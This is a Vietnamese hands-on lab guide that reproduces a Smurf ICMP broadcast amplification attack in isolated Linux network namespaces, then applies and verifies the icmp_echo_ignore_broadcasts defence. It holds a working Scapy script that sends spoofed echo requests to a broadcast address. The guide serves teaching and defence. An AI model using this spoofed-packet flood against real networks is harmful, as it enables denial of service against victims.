# HƯỚNG DẪN THỰC HÀNH: LAB 04
## Smurf Attack (ICMP Broadcast Amplification DoS)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Thực hiện tấn công từ chối dịch vụ khuếch đại Smurf Attack bằng cách gửi gói ICMP Echo Request tới địa chỉ Directed Broadcast (`10.0.0.255`) với IP nguồn giả mạo của nạn nhân (`10.0.0.200`). Toàn bộ các trạm khuếch đại trong subnet đồng loạt phản hồi, tạo hệ số khuếch đại $K = \times 3$. Sau đó kích hoạt phòng thủ `net.ipv4.icmp_echo_ignore_broadcasts = 1`.
- **Topology:** Mạng LAN ảo trên Linux Bridge `br0` gồm 5 namespaces:
  - `atk`: `10.0.0.100/24` (Attacker)
  - `vic`: `10.0.0.200/24` (Victim)
  - `amp1`, `amp2`, `amp3`: `10.0.0.11`, `10.0.0.12`, `10.0.0.13` (3 trạm khuếch đại)

---

### 2. CÁCH 1: CHẠY NHANH TỪ CÁC SCRIPT CÓ SẴN

```bash
# Bước 1: Khởi tạo topology bridge br0 và cấu hình 5 hosts
sudo bash docs/progress/LAB04/scripts/setup_lan.sh

# Bước 2: Mở tcpdump trên nạn nhân (vic) để đón bắt các gói phản hồi
sudo ip netns exec vic timeout 8 tcpdump -i vic0 -nn icmp > /tmp/vic_attack.log 2>&1 &
sleep 1

# Bước 3: Phát động tấn công khuếch đại (gửi 10 gói tới broadcast) từ atk
sudo ip netns exec atk python3 docs/progress/LAB04/scripts/smurf_attack.py
sleep 3

# Bước 4: Kiểm tra số lượng gói echo reply dội về nạn nhân (Kỳ vọng: 30 gói)
grep "echo reply" /tmp/vic_attack.log | wc -l

# Bước 5: Kích hoạt phòng thủ trên cả 3 máy khuếch đại
for h in amp1 amp2 amp3; do
    sudo ip netns exec $h sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
done

# Bước 6: Kiểm chứng lại sau phòng thủ (Kỳ vọng: 0 gói phản hồi)
sudo ip netns exec vic timeout 5 tcpdump -i vic0 -nn icmp > /tmp/vic_defended.log 2>&1 &
sleep 1
sudo ip netns exec atk python3 docs/progress/LAB04/scripts/smurf_attack.py
sleep 2
grep "echo reply" /tmp/vic_defended.log | wc -l
```

---

### 3. CÁCH 2: CHẠY ĐỘC LẬP BẰNG COPY-PASTE (STANDALONE)

Dán trực tiếp khối lệnh dưới đây vào Terminal Kali Linux:

```bash
# === 1. TẠO LINUX BRIDGE VÀ 5 NAMESPACES ===
for ns in atk vic amp1 amp2 amp3; do sudo ip netns del $ns 2>/dev/null || true; done
sudo ip link del br0 2>/dev/null || true
sudo ip link add name br0 type bridge
sudo ip link set dev br0 up

add_host() {
    local ns=$1; local ip=$2
    sudo ip netns add "$ns"
    sudo ip link add "veth_${ns}" type veth peer name "${ns}0"
    sudo ip link set "${ns}0" netns "$ns"
    sudo ip link set "veth_${ns}" master br0
    sudo ip link set "veth_${ns}" up
    sudo ip netns exec "$ns" ip link set dev lo up
    sudo ip netns exec "$ns" ip addr add "${ip}/24" brd 10.0.0.255 dev "${ns}0"
    sudo ip netns exec "$ns" ip link set dev "${ns}0" up
}
add_host "atk"  "10.0.0.100"
add_host "vic"  "10.0.0.200"
add_host "amp1" "10.0.0.11"
add_host "amp2" "10.0.0.12"
add_host "amp3" "10.0.0.13"

# Bật phản hồi broadcast trên 3 máy khuếch đại
for h in amp1 amp2 amp3; do
    sudo ip netns exec $h sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=0 >/dev/null
    sudo ip netns exec vic ping -c 1 -W 1 "10.0.0.${h#amp}" >/dev/null 2>&1 || true
done

# === 2. BẮT ĐẦU THEO DÕI VÀ PHÁT GÓI SMURF ===
sudo ip netns exec vic timeout 6 tcpdump -i vic0 -nn icmp > /tmp/smurf_test.log 2>&1 &
sleep 1

sudo ip netns exec atk python3 -c '
from scapy.all import IP, ICMP, send
pkt = IP(src="10.0.0.200", dst="10.0.0.255") / ICMP(id=0x1337)
send(pkt, count=10, inter=0.1, verbose=0)
print("[+] Đã gửi 10 gói Echo Request tới 10.0.0.255 với src=10.0.0.200")
'
sleep 2

# === 3. ĐẾM SỐ LƯỢNG PHẢN HỒI NHẬN ĐƯỢC TẠI NẠN NHÂN ===
echo "=== KẾT QUẢ ĐO LƯỜNG HỆ SỐ KHUẾCH ĐẠI ==="
TOTAL_REPLIES=$(grep "echo reply" /tmp/smurf_test.log | wc -l)
echo "Số gói phản hồi nhận được tại vic (10.0.0.200): $TOTAL_REPLIES (Kỳ vọng: 30 gói, K = 3x)"
```

---

### 4. QUAN SÁT & TIÊU CHÍ THÀNH CÔNG
1. **Trước phòng thủ:** Gửi 10 gói từ `atk` $\rightarrow$ Nạn nhân `vic` nhận được đúng 30 gói `echo reply` (10 từ `.11`, 10 từ `.12`, 10 từ `.13`).
2. **Sau phòng thủ (`icmp_echo_ignore_broadcasts = 1`):** Nạn nhân `vic` nhận được đúng 0 gói `echo reply`.

---

### 5. LỆNH DỌN DẸP MÔI TRƯỜNG
```bash
for ns in atk vic amp1 amp2 amp3; do sudo ip netns del $ns 2>/dev/null || true; done
sudo ip link del br0 2>/dev/null || true
sudo rm -f /tmp/vic_attack.log /tmp/vic_defended.log /tmp/smurf_test.log
```

